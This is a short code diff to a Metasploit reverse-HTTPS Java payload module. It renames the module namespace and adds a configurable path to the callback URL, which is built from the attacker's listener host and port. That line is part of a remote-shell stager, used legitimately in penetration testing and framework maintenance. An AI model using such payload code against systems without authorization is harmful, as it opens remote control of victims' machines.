@@ -7,7 +7,7 @@ require 'msf/core'
 require 'msf/core/handler/reverse_https'
 require 'msf/core/payload/uuid/options'
 
-module Metasploit3
+module MetasploitModule
 
   CachedSize = :dynamic
 
@@ -36,7 +36,7 @@ module Metasploit3
       uri_req_len = 5
     end
 
-    url = "https://#{datastore["LHOST"]}:#{datastore["LPORT"]}/"
+    url = "https://#{datastore["LHOST"]}:#{datastore["LPORT"]}#{luri}"
     # TODO: perhaps wire in an existing UUID from opts?
     url << generate_uri_uuid_mode(:init_java, uri_req_len)
 
